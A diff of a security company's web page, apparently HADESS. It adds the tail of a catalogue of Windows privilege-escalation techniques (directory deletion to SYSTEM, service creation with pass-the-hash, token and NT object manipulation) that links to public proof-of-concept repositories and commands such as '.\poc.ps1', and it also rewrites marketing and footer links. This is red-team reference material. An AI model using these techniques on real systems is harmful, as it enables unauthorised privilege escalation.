+<p class="wp-block-paragraph">Type: &nbsp; Directory-Deletion + Windows Media Player d/s</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>https://github.com/sailay1996/delete2SYSTEM</li>
+
+
+
+<li>.\poc.ps1</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-carolina-reaper"><strong>Carolina Reaper</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: Yes</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;Creates an arbitrary service + PTH</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://github.com/tyranid/blackhat-usa-2022-demos">https://github.com/tyranid/blackhat-usa-2022-demos</a></li>
+
+
+
+<li>Demo6.ps1</li>
+</ul>
+
+
+
+<h3 class="wp-block-heading" id="h-the-intimidator-chilli"><strong>The Intimidator Chilli</strong></h3>
+
+
+
+<p class="wp-block-paragraph">Domain: No</p>
+
+
+
+<p class="wp-block-paragraph">Local Admin: Yes</p>
+
+
+
+<p class="wp-block-paragraph">OS: Windows</p>
+
+
+
+<p class="wp-block-paragraph">Type: &nbsp;manipulate memory/process token values/NT system calls and objects/NT object manager</p>
+
+
+
+<p class="wp-block-paragraph">Methods:&nbsp;</p>
+
+
+
+<ul class="wp-block-list">
+<li>https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools</li>
+
+
+
+<li>Import-Module NtObjectManager</li>
+
+
+
+<li>Get-ChildItem NtObject:\</li>
+
+
+
+<li>NT*</li>
+</ul>
     </div>
 
     <!-- ═══ CAREER PLATFORM CTA ═══ -->
@@ -1985,27 +3342,27 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
 
         <!-- Headline -->
         <h3 style="font-family:var(--font-display);font-size:24px;font-weight:800;color:#fff;margin:0 0 8px;line-height:1.3">
-          Ready to Accelerate Your Cybersecurity Career?
+          Put this research to work on your environment
         </h3>
         <p style="font-size:15px;color:rgba(255,255,255,0.55);line-height:1.7;max-width:520px;margin:0 auto 28px">
-          Access structured learning paths, hands-on skill labs, and expert coaching — everything you need to land your next role.
+          The team behind this article runs attack surface management, SAST, red team operations and vulnerability research for organizations that need answers, not checklists.
         </p>
 
         <!-- Buttons -->
         <div style="display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap">
-          <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
+          <a href="/products/" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13.8 12H3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Start Free
+            Explore Services
           </a>
-          <a href="https://career.hadess.io/games/" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
+          <a href="/products/#contact" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Hack &amp; Learn Games
+            Talk to an Expert
           </a>
         </div>
 
         <!-- Subtle trust line -->
         <p style="font-size:12px;color:rgba(255,255,255,0.3);margin:20px 0 0;letter-spacing:0.3px">
-          100% free to start &middot; No credit card required &middot; 80+ skill modules
+          ASM &middot; SAST &middot; Red Team &middot; Vulnerability Research &middot; Career
         </p>
       </div>
     </div>
@@ -2111,11 +3468,11 @@ function showCopied(){
 <div style="max-width:var(--max-w);margin:0 auto;padding:0 32px 80px">
   <div style="background:linear-gradient(135deg,rgba(250,204,21,0.08),rgba(245,158,11,0.03));border:1px solid var(--gold-border);border-radius:20px;padding:60px;text-align:center;position:relative;overflow:hidden">
     <div style="content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(250,204,21,0.1),transparent 70%);pointer-events:none"></div>
-    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Ready to Accelerate Your Cybersecurity Career?</h2>
-    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Structured paths, expert coaching, and hands-on skill development — all in one platform.</p>
-    <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
+    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Know your exposure before attackers do.</h2>
+    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Attack surface management, SAST, red team operations and vulnerability research — from the team behind HADESS research.</p>
+    <a href="/products/" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
       <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Explore Products &amp; Services
     </a>
   </div>
 </div>
@@ -2138,59 +3495,38 @@ function showCopied(){
           </div>
           <div style="display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-muted)">
             <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color:var(--gold);flex-shrink:0"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg>
-            career@hadess.io
+            security@hadess.io
           </div>
         </div>
         <div style="display:flex;gap:12px">
           <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
           <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
           <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-          <a href="mailto:career@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+          <a href="mailto:security@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
         </div>
       </div>
-      <!-- Platform -->
-      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Platform</h3>
+      <!-- Products -->
+      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Products</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/skills-development" style="font-size:13px;color:var(--text-muted);transition:color 0.3s">Skills Development</a></li>
-          <li><a href="https://career.hadess.io/career-coaching" style="font-size:13px;color:var(--text-muted)">Career Coaching</a></li>
-          <li><a href="https://career.hadess.io/career-paths" style="font-size:13px;color:var(--text-muted)">Career Paths</a></li>
-          <li><a href="https://career.hadess.io/skills" style="font-size:13px;color:var(--text-muted)">Skills Explorer</a></li>
-          <li><a href="https://career.hadess.io/coach" style="font-size:13px;color:var(--text-muted)">Find a Coach</a></li>
-          <li><a href="https://career.hadess.io/roadmap-selector" style="font-size:13px;color:var(--text-muted)">Roadmap Selector</a></li>
-          <li><a href="https://career.hadess.io/salary-calculator" style="font-size:13px;color:var(--text-muted)">Salary Calculator</a></li>
-          <li><a href="https://career.hadess.io/tax-calculator" style="font-size:13px;color:var(--text-muted)">Tax Calculator</a></li>
-          <li><a href="https://career.hadess.io/knowledge-model" style="font-size:13px;color:var(--text-muted)">Knowledge Model</a></li>
-          <li><a href="https://career.hadess.io/pricing" style="font-size:13px;color:var(--text-muted)">Pricing</a></li>
+          <li><a href="/products/#career" style="font-size:13px;color:var(--text-muted)">Career</a></li>
+          <li><a href="/products/#asm" style="font-size:13px;color:var(--text-muted)">Attack Surface Management</a></li>
+          <li><a href="/products/#sast" style="font-size:13px;color:var(--text-muted)">SAST</a></li>
+          <li><a href="/products/#red-team" style="font-size:13px;color:var(--text-muted)">Red Team Operations</a></li>
+          <li><a href="/products/#vulnerability-research" style="font-size:13px;color:var(--text-muted)">Vulnerability Research</a></li>
         </ul>
       </div>
       <!-- Resources -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Resources</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/knowledge-base" style="font-size:13px;color:var(--text-muted)">Knowledge Base</a></li>
-          <li><a href="https://career.hadess.io/case-studies" style="font-size:13px;color:var(--text-muted)">Case Studies</a></li>
           <li><a href="/blog" style="font-size:13px;color:var(--text-muted)">Learning Materials</a></li>
-          <li><a href="https://career.hadess.io/certificate-roadmap" style="font-size:13px;color:var(--text-muted)">Certification Prep</a></li>
-          <li><a href="https://career.hadess.io/games/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Hack &amp; Learn</a></li>
           <li><a href="https://discord.gg/4XR3wWn3wp" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Community</a></li>
         </ul>
       </div>
       <!-- Company + Legal -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Company</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
-          <li><a href="https://career.hadess.io/mission" style="font-size:13px;color:var(--text-muted)">Our Mission</a></li>
-          <li><a href="mailto:career@hadess.io" style="font-size:13px;color:var(--text-muted)">Support</a></li>
-        </ul>
-        <h3 style="font-size:15px;font-weight:600;color:#fff;margin:28px 0 16px">Legal</h3>
-        <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/terms" style="font-size:13px;color:var(--text-muted)">Terms of Service</a></li>
-          <li><a href="https://career.hadess.io/privacy" style="font-size:13px;color:var(--text-muted)">Privacy Policy</a></li>
-          <li><a href="https://career.hadess.io/cancellation-policy" style="font-size:13px;color:var(--text-muted)">Cancellation Policy</a></li>
-          <li><a href="https://career.hadess.io/cookie-policy" style="font-size:13px;color:var(--text-muted)">Cookie Policy</a></li>
-          <li><a href="https://career.hadess.io/imprint" style="font-size:13px;color:var(--text-muted)">Imprint</a></li>
-          <li><a href="https://career.hadess.io/dmca" style="font-size:13px;color:var(--text-muted)">DMCA Notice</a></li>
-          <li><a href="https://career.hadess.io/image-rights" style="font-size:13px;color:var(--text-muted)">Image Rights</a></li>
-          <li><a href="https://career.hadess.io/security" style="font-size:13px;color:var(--text-muted)">Security</a></li>
+          <li><a href="/about-us/" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
+          <li><a href="mailto:security@hadess.io" style="font-size:13px;color:var(--text-muted)">Contact</a></li>
         </ul>
       </div>
     </div>
@@ -2406,11 +3742,7 @@ document.querySelectorAll('.ft-lang-dd button').forEach(function(btn){
 					} );
 				} )();
 			</script>
-			<style id="core-block-supports-inline-css">
-.wp-block-gallery.wp-block-gallery-1{--wp--style--unstable-gallery-gap:var( --wp--style--gallery-gap-default, var( --gallery-block--gutter-size, var( --wp--style--block-gap, 0.5em ) ) );gap:var( --wp--style--gallery-gap-default, var( --gallery-block--gutter-size, var( --wp--style--block-gap, 0.5em ) ) );}.wp-block-gallery.wp-block-gallery-2{--wp--style--unstable-gallery-gap:var( --wp--style--gallery-gap-default, var( --gallery-block--gutter-size, var( --wp--style--block-gap, 0.5em ) ) );gap:var( --wp--style--gallery-gap-default, var( --gallery-block--gutter-size, var( --wp--style--block-gap, 0.5em ) ) );}.wp-block-gallery.wp-block-gallery-3{--wp--style--unstable-gallery-gap:var( --wp--style--gallery-gap-default, var( --gallery-block--gutter-size, var( --wp--style--block-gap, 0.5em ) ) );gap:var( --wp--style--gallery-gap-default, var( --gallery-block--gutter-size, var( --wp--style--block-gap, 0.5em ) ) );}
-/*# sourceURL=core-block-supports-inline-css */
-</style>
-<script id="nekit-swiper-js" src="/wp-content/plugins/news-kit-elementor-addons/includes/assets/external/swiper/swiper-bundle.min.js?ver=11.2.5"></script>
+			<script id="nekit-swiper-js" src="/wp-content/plugins/news-kit-elementor-addons/includes/assets/external/swiper/swiper-bundle.min.js?ver=11.2.5"></script>
 <script data-wp-strategy="defer" defer id="slick-js" src="/wp-content/plugins/news-kit-elementor-addons/includes/assets/external/slick/slick.min.js?ver=1.8.0"></script>
 <script data-wp-strategy="defer" defer id="js-marquee-js" src="/wp-content/plugins/news-kit-elementor-addons/includes/assets/external/js-marquee/jquery.marquee.min.js?ver=1.0.0"></script>
 <script id="typed-js-js" src="/wp-content/plugins/news-kit-elementor-addons/includes/assets/external/typed-main/typed.umd.js?ver=3"></script>
